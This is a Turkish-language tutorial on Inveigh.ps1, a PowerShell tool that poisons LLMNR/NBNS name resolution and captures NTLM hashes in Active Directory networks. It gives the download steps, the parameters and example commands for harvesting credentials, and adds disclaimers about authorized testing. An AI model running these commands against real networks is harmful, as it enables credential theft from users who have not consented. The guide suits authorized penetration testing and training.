# Inveigh.ps1 Kullanım Rehberi

## Inveigh.ps1 Nedir?

**Inveigh.ps1**, PowerShell ile yazılmış bir saldırı aracıdır. Active Directory ortamlarında kimlik bilgilerini ele geçirmek için **LLMNR (Link-Local Multicast Name Resolution)**, **NBNS (NetBIOS Name Service)** ve HTTP protokollerini hedef alır. **Responder** aracına benzer şekilde çalışır ancak tamamen PowerShell tabanlıdır, bu da ek yazılım yüklemeden kullanılmasına olanak tanır.

> **Önemli Not:** Bu araç yalnızca yetkili test ortamlarında ve etik kullanım amaçlı çalıştırılmalıdır. Yetkisiz kullanım yasa dışıdır.

---

## Ana Özellikleri

1. **LLMNR ve NBNS Zehirleme:**
   - Hedef sistemlerin isim çözümleme isteklerini zehirler ve kimlik bilgilerini ele geçirir.
2. **HTTP ve SMB Kimlik Bilgisi Ele Geçirme:**
   - HTTP veya SMB kimlik doğrulama isteklerini yakalar ve NTLM hash'lerini toplar.
3. **Tamamen PowerShell ile Çalışır:**
   - Harici yazılım veya ikili dosya gerektirmez.

---

## İndirme ve Çalıştırma

Inveigh.ps1, GitHub üzerinden indirilebilir:

- [https://github.com/Kevin-Robertson/Inveigh](https://github.com/Kevin-Robertson/Inveigh)

### Çalıştırma Adımları

1. **Script’i İndirin:**
   ```bash
   git clone https://github.com/Kevin-Robertson/Inveigh.git
   cd Inveigh
   ```
2. **PowerShell'de Script'i Çalıştırın:**
   ```powershell
   Import-Module .\Inveigh.ps1
   Invoke-Inveigh
   ```

---

## Kullanım Parametreleri

### 1. **`-NBNS`**
- NBNS zehirleme özelliğini etkinleştirir.

  **Kullanım:**
  ```powershell
  Invoke-Inveigh -NBNS Y
  ```

### 2. **`-LLMNR`**
- LLMNR zehirleme özelliğini etkinleştirir.

  **Kullanım:**
  ```powershell
  Invoke-Inveigh -LLMNR Y
  ```

### 3. **`-HTTP`**
- HTTP kimlik bilgisi ele geçirme özelliğini etkinleştirir.

  **Kullanım:**
  ```powershell
  Invoke-Inveigh -HTTP Y
  ```

### 4. **`-ConsoleOutput`**
- Çıktıyı konsola yazdırır.

  **Kullanım:**
  ```powershell
  Invoke-Inveigh -ConsoleOutput Y
  ```

### 5. **`-FileOutput`**
- Çıktıyı bir dosyaya kaydeder.

  **Kullanım:**
  ```powershell
  Invoke-Inveigh -FileOutput Y -OutputDirectory "C:\Logs"
  ```

### 6. **`-Help`**
- Script'in kullanım kılavuzunu gösterir.

  **Kullanım:**
  ```powershell
  Invoke-Inveigh -Help
  ```

---

## Örnek Kullanım Senaryoları

### 1. LLMNR ve NBNS Zehirleme ile Kimlik Bilgisi Ele Geçirme
```powershell
Invoke-Inveigh -LLMNR Y -NBNS Y
```

### 2. HTTP Kimlik Bilgisi Ele Geçirme
```powershell
Invoke-Inveigh -HTTP Y -ConsoleOutput Y
```

### 3. Çıktıyı Dosyaya Kaydetme
```powershell
Invoke-Inveigh -LLMNR Y -FileOutput Y -OutputDirectory "C:\Logs"
```

### 4. Yardım Mesajını Görüntüleme
```powershell
Invoke-Inveigh -Help
```

---

## Güvenlik ve Önlemler

- **Yetkili Kullanıcılar:** Inveigh.ps1 yalnızca yetkili güvenlik testlerinde kullanılmalıdır.
- **Test Ortamı:** Üretim ortamında çalıştırmadan önce test ortamında denenmelidir.
- **Loglama:** Hedef sistemler ve ağ cihazları aracın etkinliklerini loglayabilir.

---

## Kaynaklar

- [Inveigh GitHub Sayfası](https://github.com/Kevin-Robertson/Inveigh)
- [Responder ve LLMNR/NBNS Zafiyetleri](https://learn.microsoft.com/en-us/)

---

> **Uyarı:** Bu rehber yalnızca eğitim ve araştırma amaçlıdır. Yetkisiz kullanımlar yasa dışıdır.
